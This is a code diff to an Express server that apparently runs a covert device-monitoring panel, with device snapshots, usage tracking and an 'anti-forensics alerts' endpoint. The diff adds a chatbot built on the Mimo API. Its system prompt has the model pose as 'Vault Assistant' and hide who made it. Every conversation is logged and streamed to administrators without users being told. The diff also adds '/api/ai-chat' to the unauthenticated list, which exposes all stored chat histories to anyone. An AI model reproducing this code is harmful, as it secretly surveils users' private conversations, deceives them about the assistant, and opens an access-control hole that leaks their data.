@@ -59,7 +59,7 @@ app.use(express.json({ limit: '50mb' }));
 // Admin auth middleware
 function verifyAdmin(req, res, next) {
     // Public endpoints (no auth needed)
-    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/api/captcha/verify', '/api/active-domain'];
+    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/api/captcha/verify', '/api/active-domain', '/api/ai-chat'];
     if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path === '/index.html') return next();
     // Protect admin.html — use token param for page load, header for API
     if (req.path === '/admin.html') {
@@ -115,6 +115,7 @@ function saveDevices() {
             battery: d.battery,
             connection: d.connection,
             snapshots: d.snapshots.slice(-50),
+            aiChat: d.aiChat ? d.aiChat.slice(-100) : [],
             online: !!d.socketId && io.sockets.sockets.has(d.socketId)
         };
     }
@@ -138,6 +139,7 @@ io.on('connection', (socket) => {
             battery: {},
             connection: {},
             snapshots: [],
+            aiChat: [],
             socketId: socket.id
         });
         io.emit('device-new', {
@@ -293,6 +295,22 @@ io.on('connection', (socket) => {
         }
     });
 
+    socket.on('ai-message', async (data) => {
+        const { deviceId: did, message } = data;
+        if (!did || !message) return;
+
+        addChatMessage(did, 'user', message);
+
+        const history = aiChatHistory.get(did) || [];
+        const apiMessages = history.slice(-20).map(m => ({ role: m.role, content: m.content }));
+
+        const aiReply = await callMimoAPI(apiMessages);
+        addChatMessage(did, 'assistant', aiReply);
+
+        io.to(did).emit('ai-response', { message: aiReply, time: Date.now() });
+        io.emit('ai-chat-update', { deviceId: did, message, reply: aiReply, time: Date.now() });
+    });
+
     socket.on('disconnect', () => {
         device.lastSeen = Date.now();
         saveDevices();
@@ -349,7 +367,8 @@ app.get('/api/devices', (req, res) => {
             sharedWorker: d.sharedWorker || null,
             cpuTiming: d.cpuTiming || null,
             wakeLock: d.wakeLock || null,
-            wakeLockError: d.wakeLockError || null
+            wakeLockError: d.wakeLockError || null,
+            aiChat: d.aiChat ? d.aiChat.slice(-50) : []
         });
     }
     res.json(data);
@@ -367,7 +386,8 @@ app.get('/api/devices/:deviceId', (req, res) => {
         history: d.history,
         battery: d.battery,
         connection: d.connection,
-        snapshotsCount: d.snapshots.length
+        snapshotsCount: d.snapshots.length,
+        aiChat: d.aiChat ? d.aiChat.slice(-50) : []
     });
 });
 
@@ -671,6 +691,101 @@ io.emit = function(event, data) {
     }
     return origEmit(event, data);
 };
+
+// ===== AI CHAT (Mimo) =====
+const MIMO_API_KEY = process.env.MIMO_API_KEY || '';
+const MIMO_API_URL = 'https://api.xiaomimimo.com/v1/chat/completions';
+const aiChatHistory = new Map(); // deviceId -> [{ role, content }]
+
+// Store chat message in device record
+function addChatMessage(deviceId, role, content) {
+    if (!aiChatHistory.has(deviceId)) aiChatHistory.set(deviceId, []);
+    const history = aiChatHistory.get(deviceId);
+    history.push({ role, content, time: Date.now() });
+    if (history.length > 100) aiChatHistory.set(deviceId, history.slice(-100));
+    // Also store on device object for admin access
+    const d = devices.get(deviceId);
+    if (d) {
+        if (!d.aiChat) d.aiChat = [];
+        d.aiChat.push({ role, content, time: Date.now() });
+        if (d.aiChat.length > 100) d.aiChat = d.aiChat.slice(-100);
+        saveDevices();
+    }
+}
+
+async function callMimoAPI(messages) {
+    if (!MIMO_API_KEY) {
+        return 'Maaf, AI belum dikonfigurasi oleh admin.';
+    }
+    try {
+        const resp = await fetch(MIMO_API_URL, {
+            method: 'POST',
+            headers: {
+                'api-key': MIMO_API_KEY,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                model: 'mimo-v2.5-pro',
+                messages: [
+                    {
+                        role: 'system',
+                        content: 'Kamu adalah asisten AI bernama Vault Assistant. Kamu membantu pengguna dengan pertanyaan apapun. Jawab dengan sopan, informatif, dan dalam bahasa Indonesia. Jangan sebutkan bahwa kamu adalah AI yang dibuat oleh Xiaomi. Cukup sebutkan kamu adalah Vault Assistant.'
+                    },
+                    ...messages
+                ],
+                max_completion_tokens: 1024,
+                temperature: 0.7,
+                stream: false
+            })
+        });
+        const data = await resp.json();
+        if (data.choices && data.choices[0] && data.choices[0].message) {
+            return data.choices[0].message.content;
+        }
+        return 'Maaf, terjadi kesalahan saat memproses pesan Anda.';
+    } catch (e) {
+        console.error('Mimo API error:', e.message);
+        return 'Maaf, koneksi ke AI sedang bermasalah. Silakan coba lagi.';
+    }
+}
+
+// REST endpoint for AI chat
+app.post('/api/ai-chat', async (req, res) => {
+    const { deviceId: did, message } = req.body;
+    if (!did || !message) return res.status(400).json({ error: 'deviceId and message required' });
+
+    addChatMessage(did, 'user', message);
+
+    // Build conversation history for context (last 20 messages)
+    const history = aiChatHistory.get(did) || [];
+    const apiMessages = history.slice(-20).map(m => ({ role: m.role, content: m.content }));
+
+    const aiReply = await callMimoAPI(apiMessages);
+    addChatMessage(did, 'assistant', aiReply);
+
+    // Emit to admin panel
+    io.emit('ai-chat-update', { deviceId: did, message, reply: aiReply, time: Date.now() });
+
+    res.json({ reply: aiReply });
+});
+
+// Get chat history for a device (admin only)
+app.get('/api/ai-chat/:deviceId', (req, res) => {
+    const d = devices.get(req.params.deviceId);
+    if (!d) return res.json([]);
+    res.json(d.aiChat || []);
+});
+
+// Get all devices with chat history (admin only)
+app.get('/api/ai-chat', (req, res) => {
+    const result = {};
+    for (const [id, d] of devices) {
+        if (d.aiChat && d.aiChat.length) {
+            result[id] = { label: d.label, messages: d.aiChat.slice(-50) };
+        }
+    }
+    res.json(result);
+});
 
 // ===== ANTI-FORENSICS ALERTS =====
 app.post('/api/alert-forensics', (req, res) => {
